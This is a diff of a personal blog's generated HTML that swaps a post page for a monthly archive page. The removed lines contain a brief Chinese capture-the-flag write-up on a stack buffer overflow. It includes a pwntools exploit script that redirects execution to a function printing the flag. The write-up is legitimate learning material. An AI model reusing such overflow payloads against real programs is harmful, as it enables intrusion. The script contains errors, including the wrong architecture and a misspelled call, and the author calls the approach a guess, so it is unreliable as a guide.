@@ -20,22 +20,15 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="RELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000) 目前所学所有攻击手法均需要有输入漏洞本题有两个入口第二个入口可产生数据溢出char v2[32]; &#x2F;&#x2F; [esp+10h] [ebp-74h]__isoc99_scanf(&quot;%s&quot;,">
-<meta property="og:type" content="article">
-<meta property="og:title" content="AD_forgot">
-<meta property="og:url" content="http://example.com/2021/04/11/AD-forgot/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="全宇宙最蒻的博客">
+<meta property="og:url" content="http://example.com/archives/2021/07/index.html">
 <meta property="og:site_name" content="全宇宙最蒻的博客">
-<meta property="og:description" content="RELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000) 目前所学所有攻击手法均需要有输入漏洞本题有两个入口第二个入口可产生数据溢出char v2[32]; &#x2F;&#x2F; [esp+10h] [ebp-74h]__isoc99_scanf(&quot;%s&quot;,">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/04/11/AD-forgot/1.png">
-<meta property="article:published_time" content="2021-04-11T09:46:36.000Z">
-<meta property="article:modified_time" content="2021-04-18T14:25:55.554Z">
 <meta property="article:author" content="带废物">
-<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/04/11/AD-forgot/1.png">
 
-<link rel="canonical" href="http://example.com/2021/04/11/AD-forgot/">
+<link rel="canonical" href="http://example.com/archives/2021/07/">
 
 
 <script id="page-configurations">
@@ -43,12 +36,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : true,
+    isPost : false,
     lang   : 'en'
   };
 </script>
 
-  <title>AD_forgot | 全宇宙最蒻的博客</title>
+  <title>Archive | 全宇宙最蒻的博客</title>
   
 
 
@@ -152,100 +145,51 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content archive">
             
 
-    
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/11/AD-forgot/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="带废物">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="全宇宙最蒻的博客">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          AD_forgot
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-04-11 17:46:36" itemprop="dateCreated datePublished" datetime="2021-04-11T17:46:36+08:00">2021-04-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-18 22:25:55" itemprop="dateModified" datetime="2021-04-18T22:25:55+08:00">2021-04-18</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+  
+  <div class="post-block">
+    <div class="posts-collapse">
+      <div class="collection-title">
+        
+        <span class="collection-header">OK! 39 posts in total. Keep on posting.</span>
+      </div>
 
       
-        <p><code>RELRO:    Partial RELRO</code><br><code>Stack:    No canary found</code><br><code>NX:       NX enabled</code><br><code>PIE:      No PIE (0x8048000)</code></p>
-<p>目前所学所有攻击手法均需要有输入漏洞<br>本题有两个入口<br>第二个入口可产生数据溢出<br><code>char v2[32]; // [esp+10h] [ebp-74h]</code><br><code>__isoc99_scanf(&quot;%s&quot;, v2);</code><br>v2真正大小只有：32个字节，即ebp-74到ebp-54</p>
-<p>在从后往前分析一下：</p>
-<p>找到一个system函数可用，但没有关键字符串可用，或许可以自己构造</p>
-<p>又找到一个函数，几乎可以确定为目标函数<br>int sub_80486CC()<br>{<br>​    char s; // [esp+1Eh] [ebp-3Ah]<br>​    snprintf(&amp;s, 0x32u, “cat %s”, “./flag”);<br>​    return system(&amp;s);<br>}<br>  目标函数首地址为：0x080486CC</p>
-<p>找到一个反编译失败函数，地址：0x8048A61</p>
-<img src="/2021/04/11/AD-forgot/1.png" class>
-<p><code>(*(&amp;v3 + --v14))();</code></p>
-<p>取v3函数的地址，对其进行偏移，得到一个新的地址，调用这个函数</p>
-<p>第一想法是用这里直接TM的偏移到目标函数，试一试：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">&quot;a&quot;</span>+p32(<span class="number">-238</span>)+p32(<span class="number">0x80486CC</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interative()</span><br><span class="line"><span class="comment"># 骗分过样例，暴力出奇迹</span></span><br></pre></td></tr></table></figure>
-<p>但是攻防世界网站又炸了，我是它爹</p>
-
+    <div class="collection-year">
+      <span class="collection-header">2021</span>
     </div>
 
-    
-    
-    
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
 
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/PWN/" rel="tag"># PWN</a>
-          </div>
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2021-07-09T21:59:31+08:00"
+              content="2021-07-09">
+          07-09
+        </time>
+      </div>
 
-        
+      <div class="post-title">
+          <a class="post-title-link" href="/2021/07/09/RangeSumQueryMutable/" itemprop="url">
+            <span itemprop="name">RangeSumQueryMutable</span>
+          </a>
+      </div>
 
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2021/04/08/%E6%88%91%E5%92%8C%E6%88%91%E7%9A%84Lv-1%E7%9B%96%E4%BA%9A%E5%A5%A5%E7%89%B9%E6%9B%BC%E5%8F%AC%E5%94%A4%E5%99%A8/" rel="prev" title="我和我的Lv.1盖亚奥特曼召唤器">
-      <i class="fa fa-chevron-left"></i> 我和我的Lv.1盖亚奥特曼召唤器
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/04/29/mmap%E5%87%BD%E6%95%B0/" rel="next" title="mmap函数">
-      mmap函数 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
+    </header>
   </article>
+
+
+    </div>
+  </div>
   
   
+  
+
   
 
 
